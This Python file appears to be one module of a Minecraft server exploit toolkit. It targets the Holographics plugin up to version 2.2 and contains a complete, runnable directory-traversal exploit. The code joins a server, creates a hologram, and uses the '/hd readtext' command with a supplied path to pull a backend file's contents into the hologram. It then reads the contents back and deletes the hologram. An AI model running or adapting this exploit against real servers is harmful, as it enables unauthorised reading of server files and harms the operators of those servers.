from minecraft.networking.connection import Connection
import minecraft.networking.packets
from minecraft.networking.packets import Packet, clientbound, serverbound
import sys
import time
import random
import string


class Exploit:
    """Exploit schema"""
    def __init__(self, client: Connection = None, directory: str = None):
        self.name = "Holographics <= v2.2.*"
        self.description = "Read existing backend file paths via directory traversal"
        self.client = client
        self.directory = directory

    def onJoin(self, dog):
        print('Connected', dog)

    def waitForResponse(self, chat_packet):
        print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))

    def execute(self) -> tuple[bool, str]:
        self.client.register_packet_listener(
            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event

        self.client.register_packet_listener(
            self.onJoin, minecraft.networking.packets.JoinGamePacket)

        self.client.connect()

        input('Press enter joined.')

        holoName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

        time.sleep(1.5)

        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure

        packet.message = "/hd create %s" % holoName  #: creates hologram
        self.client.write_packet(packet)  #: sends message

        time.sleep(2.0)

        packet.message = f"/hd readtext %s %s" % (holoName, self.directory)  #: pastes lines from file into hologram
        self.client.write_packet(packet)  #: sends message

        time.sleep(2.0)

        packet.message = "/hd info %s" % holoName  #: lists all lines from hologram
        self.client.write_packet(packet)  #: sends message

        time.sleep(2.0)

        packet.message = "/hd delete %s" % holoName  #: lists all lines from hologram
        self.client.write_packet(packet)  #: sends message

        input('Press enter joined.')

        return True, "Success in Message"
